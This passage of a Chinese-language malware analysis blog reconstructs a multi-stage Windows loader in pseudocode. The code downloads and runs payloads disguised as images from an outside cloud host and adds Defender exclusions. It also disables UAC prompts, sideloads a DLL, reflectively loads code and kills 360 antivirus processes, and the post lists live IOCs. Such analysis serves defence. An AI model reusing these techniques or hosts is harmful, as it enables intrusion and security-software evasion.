<li>[198] wscreg.exe</li>
<li>[199] MpDefenderCoreService.exe</li>
<li>[200] 360sdUpd.exe</li>
<li>[201] 360safeupa.exe</li>
<li>[202] 360DiagnoseScan.exe</li>
<li>[203] 360SecLogonHelper.exe</li>
<li>[204] QMProviderUpdate.exe</li>
<li>[205] QQPCUpdateAVLib.exe</li>
<li>[206] QMCheckNetwork.exe</li>
<li>[207] QQPCMgrDaemon.exe</li>
<li>[208] kupdata.exe</li>
<li>[209] kxewsc.exe</li>
<li>[210] kdrvmgr.exe</li>
<li>[211] kismain.exe</li>
</ul>
<h5 id="远程文件读取"><a href="#远程文件读取" class="headerlink" title="远程文件读取"></a>远程文件读取</h5><p><code>anti_security_worker_main</code>似乎是主要功能函数，去掉”不透明谓词”后的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">anti_security_worker_main</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    path = decrypt_desktopbak_path_once(); <span class="comment">//解密后是C:\Users\Public\Music\destopbak.ini</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        Sleep(<span class="number">0x2BF20</span>);</span><br><span class="line">        <span class="keyword">if</span> (!check_single_instance_mutex()) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!scan_security_processes_variant_a() &amp;&amp; !scan_security_processes_variant_b()) &#123;</span><br><span class="line">            Sleep(<span class="number">0xEA60</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        url = decrypt_url_once();</span><br><span class="line">        payload = network_communication(url);</span><br><span class="line">        exec_buf = unpack_and_prepare(payload);</span><br><span class="line">        VirtualProtect(exec_buf, ..., PAGE_EXECUTE_READWRITE, ...);</span><br><span class="line">        file_io_operations(path);</span><br><span class="line">        ((<span class="type">void</span>(*)())exec_buf)();</span><br><span class="line">        <span class="built_in">free</span>(payload); <span class="built_in">free</span>(exec_buf);</span><br><span class="line">        <span class="keyword">if</span> (desktopbak_tail_byte(path) == <span class="number">0x40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>check_single_instance_mutex</code>的伪代码如下:</p>
<p>检查互斥体是否存在，样本中还内置了两个全局互斥体样式字符串：</p>
<ul>
<li><code>Global\8E416074-5245-AF71-E9F7-7D3194498C53</code></li>
<li><code>Global\3575D265-2C4F-5C20-EB78-D147D5670A9C</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_single_instance_mutex</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 固定互斥体探测</span></span><br><span class="line">    h1 = OpenMutexA(<span class="number">0x1F0001</span>, FALSE, <span class="string">&quot;&#123;4E062DDA-444A-A2A8-84CE-E105F66A5AB3&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (h1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        CloseHandle(h1);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//主机名绑定互斥体探测</span></span><br><span class="line">    name = <span class="string">&quot;aefd_&quot;</span> + GetComputerNameA();</span><br><span class="line">    h2 = OpenMutexA(<span class="number">0x1F0001</span>, FALSE, name);</span><br><span class="line">    <span class="keyword">if</span> (h2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        CloseHandle(h2);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>scan_security_processes_variant_a</code>检查360安全软件检查360Safe.exe、360tray.exe、360sd.exe、Bka.exe、QHSafeTray.exe，其伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">scan_security_processes_variant_a</span><span class="params">()</span> &#123;</span><br><span class="line">    n1 = decode_i_minus_const(get_encrypted_probe_name_360safe(), <span class="number">0x2D</span>);   <span class="comment">// 见下</span></span><br><span class="line">    n2 = decode_i_minus_const(get_encrypted_probe_name_360tray(), <span class="number">0x2C</span>);</span><br><span class="line">    n3 = decode_i_minus_const(get_encrypted_probe_name_360sd(), <span class="number">0x2B</span>);</span><br><span class="line">    n4 = decode_i_minus_const(get_encrypted_probe_name_bka(), <span class="number">0x29</span>);</span><br><span class="line">    n5 = decode_i_minus_const(get_encrypted_probe_name_qhsafetray(), <span class="number">0x28</span>);</span><br><span class="line">    names = [n1, n2, n3, n4, n5];</span><br><span class="line"></span><br><span class="line">    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (snap == INVALID_HANDLE_VALUE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ok = Process32First(snap, &amp;pe); ok; ok = Process32Next(snap, &amp;pe)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (_stricmp(pe.szExeFile, names[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>scan_security_processes_variant_b</code>函数则是针对火绒核心进程的精简检测器，其伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">scan_security_processes_variant_b</span><span class="params">()</span> &#123;</span><br><span class="line">    names = [<span class="string">&quot;HipsMain.exe&quot;</span>, <span class="string">&quot;HipsTray.exe&quot;</span>];</span><br><span class="line">    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (snap == INVALID_HANDLE_VALUE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ok = Process32First(snap, &amp;pe); ok; ok = Process32Next(snap, &amp;pe)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_stricmp(pe.szExeFile, names[<span class="number">0</span>]) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (_stricmp(pe.szExeFile, names[<span class="number">1</span>]) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>network_communication</code>会读取url（<code>https://nm25.oss-cn-hangzhou.aliyuncs.com/fs.jpg</code>）指定的文件内容到堆内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">network_communication</span><span class="params">(url, out_buf, out_len)</span> &#123;</span><br><span class="line">    ua = decrypt_ua_once(); <span class="comment">// &quot;GetData&quot;</span></span><br><span class="line">    hRoot = InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    hUrl  = InternetOpenUrlA(hRoot, url, <span class="literal">NULL</span>, <span class="number">0</span>, INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    buf = HeapAlloc(GetProcessHeap(), <span class="number">0</span>, init_size);</span><br><span class="line">    <span class="keyword">while</span> (InternetReadFile(hUrl, chunk, chunk_len, &amp;n) &amp;&amp; n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        append_chunk_with_realloc(buf, chunk, n); <span class="comment">// 内部走 copy_payload_bytes 风格复制</span></span><br><span class="line">    &#125;</span><br><span class="line">    *out_buf = buf;</span><br><span class="line">    *out_len = total;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>file_io_operations</code>似乎会对 <code>destopbak.ini</code> 进行“读首字节&#x2F;读末字节&#x2F;回写首字节”的状态机操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">file_io_operations</span><span class="params">(path)</span> &#123;</span><br><span class="line">    h = CreateFileA(path, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, ...);</span><br><span class="line">    <span class="keyword">if</span> (h == INVALID_HANDLE_VALUE) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ReadFile(h, &amp;first_byte, <span class="number">1</span>, ...);</span><br><span class="line">    SetFilePointer(h, <span class="number">-1</span>, <span class="literal">NULL</span>, FILE_END);</span><br><span class="line">    ReadFile(h, &amp;last_byte, <span class="number">1</span>, ...);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="comment">/* 若干门控成立 */</span>) &#123;</span><br><span class="line">        first_byte = first_byte + <span class="number">1</span>; <span class="comment">// 分支中也可能置 1，本质是更新状态字节</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SetFilePointer(h, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line">    WriteFile(h, &amp;first_byte, <span class="number">1</span>, ...);</span><br><span class="line">    CloseHandle(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后在堆内存中解压文件并执行</p>
<h3 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h3><p>主函数伪代码如下：</p>
<p>弹窗文本：此文件版本与正在运行的360安全卫士或360杀毒软件虚拟化技术冲突，请退出正在运行的360安全卫士或360杀毒，等待360安全卫士或360杀毒完全退出后点击确定以获得暂时的支持，或联系软件发布者获取新版本。</p>
<p>弹窗标题：警告</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sc_entry_main</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBoxA_p = resolve_api_by_hash(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    Sleep_p       = resolve_api_by_hash(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> marker[] = <span class="string">&quot;v:\\qqqq.bgb&quot;</span>;</span><br><span class="line">    caesar_shift_decrypt_inplace(marker, <span class="number">19</span>);        <span class="comment">// -&gt; &quot;c:\\xxxx.ini&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (check_file_exists_not_dir(marker)) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 存在即退出</span></span><br><span class="line">    <span class="keyword">if</span> (timing_sleep_skew_check()) <span class="keyword">return</span> <span class="number">0</span>;         <span class="comment">// 睡眠偏差检测</span></span><br><span class="line">    <span class="keyword">if</span> (rdtsc_vm_timing_check()) <span class="keyword">return</span> <span class="number">0</span>;           <span class="comment">// RDTSC 时间差检测</span></span><br><span class="line">    <span class="keyword">if</span> (check_360_presence_gate()) &#123;</span><br><span class="line">        CreateThread_p = resolve_api_by_hash(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">        <span class="comment">// 最多创建 5 个反 360 线程</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &amp;&amp; check_360_presence_gate(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j) &#123;</span><br><span class="line">                HANDLE h = CreateThread_p(<span class="literal">NULL</span>, <span class="number">0</span>, anti_360_thread_worker, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (!h) <span class="keyword">continue</span>;</span><br><span class="line">                Sleep_p(<span class="number">1000</span>);</span><br><span class="line">                <span class="keyword">if</span> (!check_360_presence_gate()) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 若仍检测到 360，弹窗循环最多 100 次</span></span><br><span class="line">        Sleep_p(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">100</span> &amp;&amp; check_360_presence_gate(); ++k) &#123;</span><br><span class="line">            MessageBoxA_p(<span class="literal">NULL</span>, warn_text_gbk, warn_caption_gbk, <span class="number">0x1030</span>);</span><br><span class="line">            Sleep_p(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 360 消失后才执行主载荷</span></span><br><span class="line">        <span class="keyword">if</span> (!check_360_presence_gate()) &#123;</span><br><span class="line">            try_add_defender_exclusions();</span><br><span class="line">            Sleep_p(<span class="number">200</span>);</span><br><span class="line">            core_payload_stage_orchestrator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        try_add_defender_exclusions();</span><br><span class="line">        Sleep_p(<span class="number">200</span>);</span><br><span class="line">        core_payload_stage_orchestrator(); <span class="comment">//Add-MpPreference -ExclusionPath添加白名单目录</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>check_defender_related_processes</code> 会检查：msmpeng.exe, securityhealthsystray.exe, mpcopyaccelerator.exe,<br>MpDefenderCoreService.exe, NisSrv.exe。</p>
<p><code>core_payload_stage_orchestrator</code>中大量使用下面的方式远程读取文件</p>
<ul>
<li><code>InternetOpenA(&quot;GetData&quot;, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)</code></li>
<li><code>InternetOpenUrlA(hInternet, url, NULL, 0, 0x80000000, 0)</code></li>
<li><code>InternetReadFile</code> 循环读取，动态扩容堆缓冲。</li>
</ul>
<p>先读取 <code>https://nm25.oss-cn-hangzhou.aliyuncs.com/f.dat</code></p>
<p><code>f.dat</code> 解密后 <code>variant16</code> 字段：</p>
<ul>
<li><code>0x170</code>：<code>https://nm25.oss-cn-hangzhou.aliyuncs.com/FOM-50.jpg</code></li>
</ul>
<ul>
<li><code>0x1C0</code>：<code>https://nm25.oss-cn-hangzhou.aliyuncs.com/FOM-51.jpg</code></li>
<li><code>0x210</code>：<code>https://nm25.oss-cn-hangzhou.aliyuncs.com/FOM-52.jpg</code></li>
<li><code>0x260</code>：<code>https://nm25.oss-cn-hangzhou.aliyuncs.com/FOM-53.jpg</code></li>
<li><code>0x2B0</code>：<code>aaaaaaaaaaaaaaaaaaaaaaa.exe</code></li>
<li><code>0x2E0</code>：<code>XPSPLOG.dll</code></li>
<li><code>0x310</code>：<code>image.png</code></li>
<li><code>0x340</code>：<code>thumbs.db</code></li>
</ul>
<p>随后：</p>
<ul>
<li><code>build_path_plan_variant16</code>：<ul>
<li><code>&quot;T:\\Gifxird Wzcvj (o86)\\&quot;</code>（key&#x3D;17） -&gt; <code>C:\Program Files (x86)\</code></li>
<li>生成 6 位随机目录名，创建目录并设隐藏属性。</li>
</ul>
</li>
<li>构建目标路径：<ul>
<li><code>path1 = &lt;dir&gt; + &lt;rand6&gt; + &quot;.exe&quot;</code></li>
<li><code>path2 = &lt;dir&gt; + &quot;XPSPLOG.dll&quot;</code></li>
<li><code>path3 = &lt;dir&gt; + &quot;thumbs.db&quot;</code></li>
<li><code>path4 = &lt;dir&gt; + &quot;image.png&quot;</code></li>
</ul>
</li>
<li>依次下载并解包 4 个 <code>FOM-5x.jpg</code>，每个包流程一致：<ul>
<li><code>wininet_download_to_heap_buffer</code> 下载</li>
<li><code>parse_tail_len_and_seed_from_blob</code> 取尾部长度&#x2F;种子</li>
<li><code>xor_decrypt_linear_seed</code> 解密主体</li>
<li><code>heap_alloc_copy_payload_slice</code> 拷贝可执行片段</li>
<li>局部补丁（<code>patch_*</code> + <code>find_substring_and_patch_tail</code>）</li>
<li><code>write_buffer_to_file_path</code> 落地到上述 4 个目标路径</li>
</ul>
</li>
<li>第 4 个包额外执行 <code>read_jdbcc_registry_profile</code>：<ul>
<li>读取 <code>HKLM\SOFTWARE\JDBCC\data</code></li>
<li>以标记 <code>%&amp;$6@=*</code> 定位配置块，解出 IP&#x2F;端口&#x2F;字符串并补丁写入模板</li>
<li>IP：<strong>8.218.220.211</strong>，字符串：<strong>aceqqj.net</strong>，端口：<strong>220.211</strong></li>
<li>落地到 thumbs.db 中</li>
</ul>
</li>
<li><code>SetCurrentDirectoryA(&lt;dir&gt;)</code>，随后对 4 个文件 <code>SetFileAttributesA(attr|HIDDEN|SYSTEM)</code>。</li>
<li><code>shell_execute_runas_target(path7800)</code>：以 <code>runas</code> 方式执行落地 <code>.exe</code>（最多重试 100 次）。</li>
</ul>
<p>通过runas直接启动该带有白签名的exe文件。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771491917983.png" alt="1771491917983"></p>
<h3 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h3><h4 id="DLL侧载（白-黑）-1"><a href="#DLL侧载（白-黑）-1" class="headerlink" title="DLL侧载（白+黑）"></a>DLL侧载（白+黑）</h4><p>在XPSPLOG.dll的导出函数 <code>XPSPLOG_2</code>中存在shellcode的解密与执行，其伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">XPSPLOG_2</span><span class="params">(...)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!check_single_instance_mutex()) ExitProcess(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    SetProcessShutdownParameters(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    SetConsoleCtrlHandler(console_shutdown_ctrl_handler, TRUE);</span><br><span class="line">    <span class="keyword">if</span> (!LoadLibraryA(<span class="string">&quot;msvcrt.dll&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    HANDLE self = GetCurrentProcess();</span><br><span class="line">    <span class="type">void</span>* stage = extract_stage_from_host_exe_and_rc4_decrypt(); <span class="comment">// 0x3000</span></span><br><span class="line">    <span class="type">void</span>* exec = VirtualAllocEx(self, <span class="literal">NULL</span>, <span class="number">0x3000</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">if</span> (exec &amp;&amp; WriteProcessMemory(self, exec, stage, <span class="number">0x3000</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        ((<span class="type">void</span>(*)())exec)();   <span class="comment">// 直接执行解密阶段</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) Sleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>check_single_instance_mutex</code>的伪代码如下，创建互斥体（主机名绑定，与前面阶段联动）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_single_instance_mutex</span><span class="params">()</span> &#123;</span><br><span class="line">    name = <span class="string">&quot;aefd_&quot;</span> + GetComputerNameA();</span><br><span class="line">    CreateMutexA(<span class="literal">NULL</span>, FALSE, name);</span><br><span class="line">    <span class="keyword">return</span> (GetLastError() != ERROR_ALREADY_EXISTS); <span class="comment">// 183</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从宿主中找到marker并解密</p>
<h4 id="内置shellcode"><a href="#内置shellcode" class="headerlink" title="内置shellcode"></a>内置shellcode</h4><p>起始位置jmp 0xF25跳转到主函数执行，该函数解密之前落地的 <code>image.png</code>并反射加载dll，找到其导出函数 <code>PhilipsCoInitialize</code>并执行，其伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xF25</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">stage0_shellcode_loader_entry</span><span class="params">()</span> &#123;</span><br><span class="line">    api = build_core_api_table(); <span class="comment">// CreateFileA/GetFileSize/ReadFile 等</span></span><br><span class="line">    hFile = api.CreateFileA(<span class="string">&quot;image.png&quot;</span>, GENERIC_READ, FILE_SHARE_READ, ...);</span><br><span class="line">    fileSize = api.GetFileSize(hFile, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    malloc_fn = resolve_api_dynamic(<span class="string">&quot;msvcrt.dll&quot;</span>, <span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    buf = malloc_fn(fileSize);</span><br><span class="line">    api.ReadFile(hFile, buf, fileSize, &amp;read, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尾部格式：... [4-byte offset][1-byte seed]</span></span><br><span class="line">    offset = *(<span class="type">uint32_t</span>*)&amp;buf[fileSize - <span class="number">5</span>];</span><br><span class="line">    seed   = buf[fileSize - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    xor_decrypt_incremental_stream(buf, fileSize, offset, seed);</span><br><span class="line">    payload = alloc_and_copy_decrypted_tail_payload(buf, fileSize, offset); <span class="comment">// len=fileSize-offset-5</span></span><br><span class="line"></span><br><span class="line">    nt = &#123;</span><br><span class="line">      LdrGetProcedureAddress      = resolve_api_dynamic(<span class="string">&quot;ntdll.dll&quot;</span>,<span class="string">&quot;LdrGetProcedureAddress&quot;</span>),</span><br><span class="line">      NtAllocateVirtualMemory     = resolve_api_dynamic(<span class="string">&quot;ntdll.dll&quot;</span>,<span class="string">&quot;NtAllocateVirtualMemory&quot;</span>),</span><br><span class="line">      LdrLoadDll                  = resolve_api_dynamic(<span class="string">&quot;ntdll.dll&quot;</span>,<span class="string">&quot;LdrLoadDll&quot;</span>),</span><br><span class="line">      RtlInitAnsiString           = resolve_api_dynamic(<span class="string">&quot;ntdll.dll&quot;</span>,<span class="string">&quot;RtlInitAnsiString&quot;</span>),</span><br><span class="line">      RtlAnsiStringToUnicodeString= resolve_api_dynamic(<span class="string">&quot;ntdll.dll&quot;</span>,<span class="string">&quot;RtlAnsiStringToUnicodeString&quot;</span>),</span><br><span class="line">      RtlFreeUnicodeString        = resolve_api_dynamic(<span class="string">&quot;ntdll.dll&quot;</span>,<span class="string">&quot;RtlFreeUnicodeString&quot;</span>),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    mappedBase = manual_map_pe_with_native_apis(payload, payload_len, nt);</span><br><span class="line"></span><br><span class="line">    fn = get_export_address_by_name(mappedBase, <span class="string">&quot;PhilipsCoInitialize&quot;</span>);</span><br><span class="line">    fn(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0x401000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="反射dll载荷"><a href="#反射dll载荷" class="headerlink" title="反射dll载荷"></a>反射dll载荷</h4><p>该dll载荷和stage 4的npwzwmc64.dll功能高度重合，且带有VMprotect壳，脱壳后的入口函数依然高度混淆。通过大模型修复IAT表、反编译函数后还原出的功能逻辑如下。</p>
<p>核心函数：<code>malware_main_thread_orchestrator</code></p>
<ul>
<li>修改 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin = 0</code>。</li>
<li>创建多个线程:<ul>
<li><code>kill_360_tray_window_loop</code> 干掉360进程窗口</li>
<li><code>process_hunt_download_and_install_ranchserv</code> 内核级干掉杀软</li>
<li><code>watchdog_kill_360tray_thread</code> 拦截360tray.exe的对外通信</li>
<li><code>watchdog_kill_360safe_thread</code> 拦截360safe.exe的对外通信</li>
<li><code>add_defender_exclusion_via_schtasks_thread</code></li>
<li><code>disable_windows_update_stack_thread</code></li>
</ul>
</li>
<li>通过 PowerShell&#x2F;SCHTASKS + <code>reg add</code> 添加 Defender 排除。</li>
</ul>
